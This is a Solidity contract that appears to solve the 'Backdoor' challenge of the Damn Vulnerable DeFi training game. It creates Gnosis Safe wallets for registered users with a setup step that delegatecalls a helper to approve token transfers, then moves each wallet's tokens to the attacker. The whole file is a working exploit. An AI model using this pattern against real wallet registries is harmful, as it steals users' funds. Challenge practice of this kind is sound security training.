// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";
import "./TokenApprove.sol";

contract BackdoorAttacker {
    TokenApprove app;

    constructor(WalletRegistry walletRegistry, GnosisSafe masterCopy, GnosisSafeProxyFactory walletFactory, address[] memory users, address player, DamnValuableToken token) payable {
        for (uint256 i = 0; i<users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            app = new TokenApprove();
            bytes memory approveAction = abi.encodeWithSignature("approve(address,address,uint256)", address(token), address(this), 10 ether);
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(app), // to => setupModules(to, data); => delegatecall
                approveAction, // data => setupModules(to, data); => delegatecall
                address(0), // fallback manager
                address(0),  
                0, 
                address(0)
            );

            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                block.timestamp,
                walletRegistry
            );

            uint256 balance = token.balanceOf(address(proxy));
            token.transferFrom(address(proxy), player, balance);
        }
    }
}